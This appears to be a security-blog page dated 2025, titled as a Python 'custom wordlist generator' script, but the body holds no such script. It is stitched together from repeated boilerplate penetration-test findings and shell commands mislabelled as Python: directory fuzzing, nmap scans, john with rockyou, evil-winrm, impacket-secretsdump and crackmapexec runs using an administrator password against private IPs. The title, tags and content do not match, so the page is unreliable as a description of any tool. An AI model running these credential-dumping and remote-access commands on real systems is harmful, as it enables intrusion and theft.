---
TitleSEO: "Custom Wordlist Generator in Python | ZureFX"
TitlePost: "Custom Wordlist Generator — Python"
Author: "ZureFX"
Description: "A Python script for custom wordlist generator. Built for security research and automation."
Keywords: "rust, bash, python, scanner"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-424.html"
URL_IMAGES: ""
Date: "2025-12-22"
Tags: "Rust, Bash, Python, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-424"
Permalink: "/scripting/script-custom-wordlist-generator-424.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `sharphound`
- `hydra`
- `wmiexec`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

```python
gobuster dir -u http://10.105.213.58/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.72.41.236/FUZZ
nmap -sCV -p1433,21,993 10.124.101.234 -oN scan.txt
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.121.119.56/FUZZ
gobuster dir -u http://10.126.213.3/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.127.96.98 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.13.245
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.233.40/FUZZ
crackmapexec smb 10.41.182.115 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p21,27017,389 10.62.44.85 -oN scan.txt
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 11.54s
```
